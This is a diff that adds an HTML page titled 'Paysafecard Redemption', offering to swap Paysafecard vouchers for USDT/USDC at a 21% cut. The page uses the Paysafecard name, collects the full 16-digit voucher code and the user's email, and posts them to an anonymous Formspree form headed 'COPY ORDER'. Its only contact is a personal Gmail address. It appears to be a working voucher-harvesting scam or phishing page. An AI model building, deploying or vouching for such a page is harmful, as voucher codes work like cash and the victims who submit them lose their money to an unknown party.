@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Paysafecard Redemption</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #0055cc;
+      color: white;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 3rem auto;
+      background: #003d99;
+      padding: 20px;
+      border-radius: 8px;
+    }
+
+    /* Explain button */
+    #explainButton {
+      width: 100%;
+      background-color: #004bb5;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 12px 15px;
+      font-size: 1rem;
+      font-weight: bold;
+      cursor: pointer;
+      margin-bottom: 1.5rem;
+      user-select: none;
+      transition: background-color 0.3s ease;
+      text-align: left;
+      position: relative;
+      overflow: hidden;
+      white-space: normal;
+      line-height: 1.4;
+    }
+
+    #explainButton:hover {
+      background-color: #003a8c;
+    }
+
+    /* Hidden explanatory text inside button */
+    #explainText {
+      display: none;
+      margin-top: 10px;
+      font-weight: normal;
+      font-size: 0.9rem;
+      color: #d0e0ff;
+      white-space: pre-wrap;
+      user-select: text;
+      border-top: 1px solid #003a8c;
+      padding-top: 10px;
+    }
+
+    #explainButton.expanded {
+      background-color: #003a8c;
+    }
+
+    #explainButton.expanded #explainText {
+      display: block;
+    }
+
+    .title-box {
+      border: 2px dashed white; /* dashed border */
+      padding: 20px 25px;
+      border-radius: 6px;
+      text-align: center;
+      margin-bottom: 1.5rem;
+      user-select: none; /* prevent selection for neatness */
+    }
+
+    .title-box h1 {
+      margin: 0;
+      font-size: 3rem; /* Bigger title */
+      line-height: 1.1;
+      font-weight: bold;
+    }
+
+    .subtitle {
+      margin-top: 0.4rem;
+      font-size: 1.2rem;
+      color: #d0e0ff;
+      font-weight: 600;
+    }
+
+    label {
+      display: block;
+      margin-top: 1rem;
+      font-weight: bold;
+    }
+
+    input, select, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 0.5rem;
+      font-size: 1rem;
+      border-radius: 5px;
+      border: none;
+      box-sizing: border-box;
+    }
+
+    button[type="submit"] {
+      background: #0099ff;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 1.5rem;
+      transition: background-color 0.3s ease;
+    }
+
+    button[type="submit"]:hover {
+      background: #007acc;
+    }
+
+    .result {
+      margin-top: 1rem;
+      background: #007acc;
+      padding: 15px;
+      border-radius: 6px;
+      text-align: center;
+      font-size: 1.1rem;
+    }
+
+    footer {
+      text-align: center;
+      font-size: 0.85rem;
+      padding: 10px 0;
+      background: #003d99;
+      color: #b0cfff;
+      margin-top: 3rem;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+
+  <button id="explainButton" aria-expanded="false" aria-controls="explainText" onclick="toggleExplain()">
+    READ FIRST:
+    <div id="explainText" role="region" aria-live="polite">
+Exchange to USDT / USDC / MANUAL CURRENCY Input.
+You will get deducted for your voucher -21%. You receive the chosen calculations.
+After max. 10 min you receive all good for sending your request. Thank you and behave good.
+
+You choose manual option we manual take care of your chosen currency.
+
+MIN: 10€
+Disclaimer: we are not responsible for any block neither currency code from country only accepted not all countries can resolved.
+
+NETHERLAND
+BELGIUM
+LUXEMBOURG
+
+- IF YOU HAVE OTHER CURRENCIES DON'T TRY TO INPUT. COSTUMER EMAIL ANSWER IN 5 MINUTES MAX' try to help you with country codes
+
+CONTACT EMAIL: DIRKSURMASSIE@GMAIL.COM
+    </div>
+  </button>
+
+  <!-- Title with dashed border square -->
+  <div class="title-box">
+    <h1>Paysafecard</h1>
+    <div class="subtitle">Redemption</div>
+  </div>
+
+  <form id="redemptionForm" action="https://formspree.io/f/mkgzzala" method="POST" onsubmit="return validateAndSubmit()">
+    <input type="hidden" name="_subject" value="COPY ORDER" />
+
+    <!-- Email -->
+    <label for="email">Your Email:</label>
+    <input type="email" id="email" name="Email" placeholder="you@example.com" required />
+
+    <!-- Code -->
+    <label for="code">Paysafecard Code:</label>
+    <input type="text" id="code" name="Paysafecard Code" maxlength="16" placeholder="16-digit code" required />
+
+    <!-- Currency -->
+    <label for="currency">Currency:</label>
+    <select id="currency" name="Currency" required>
+      <option value="USDT">USDT</option>
+      <option value="USDC">USDC</option>
+      <option value="Manual">Manual Input</option>
+    </select>
+
+    <label for="manualCurrency">Manual Currency (if selected):</label>
+    <input type="text" id="manualCurrency" name="Manual Currency" placeholder="Enter custom currency (optional)" />
+
+    <!-- Amount -->
+    <label for="amount">Amount (€):</label>
+    <input type="number" id="amount" name="Original Amount" min="10" max="250" placeholder="10 - 250" required />
+
+    <!-- Final amount hidden field -->
+    <input type="hidden" id="finalAmount" name="Final Amount" />
+
+    <!-- Result -->
+    <div class="result" id="resultBox">Amount after 21% deduction: —</div>
+
+    <!-- Submit -->
+    <button type="submit">Submit Order</button>
+  </form>
+</div>
+
+<footer>
+  &copy; 2025 Paysafecard Redemption
+</footer>
+
+<script>
+  function toggleExplain() {
+    const button = document.getElementById("explainButton");
+    const expanded = button.classList.toggle("expanded");
+    button.setAttribute("aria-expanded", expanded ? "true" : "false");
+  }
+
+  const amountInput = document.getElementById("amount");
+  const resultBox = document.getElementById("resultBox");
+  const finalAmountField = document.getElementById("finalAmount");
+
+  amountInput.addEventListener("input", () => {
+    const amount = parseFloat(amountInput.value);
+    if (!isNaN(amount) && amount >= 10 && amount <= 250) {
+      const final = (amount * 0.79).toFixed(2);
+      resultBox.textContent = `Amount after 21% deduction: €${final}`;
+      finalAmountField.value = final;
+    } else {
+      resultBox.textContent = "Amount after 21% deduction: —";
+      finalAmountField.value = "";
+    }
+  });
+
+  function validateAndSubmit() {
+    const code = document.getElementById("code").value.trim();
+    const currency = document.getElementById("currency").value;
+    const manualCurrency = document.getElementById("manualCurrency").value;
+
+    if (!/^\d{16}$/.test(code)) {
+      alert("Please enter a valid 16-digit Paysafecard code.");
+      return false;
+    }
+
+    if (currency === "Manual" && manualCurrency.trim() === "") {
+      alert("Please enter a manual currency name.");
+      return false;
+    }
+
+    return true;
+  }
+</script>
+
+</body>
+</html>
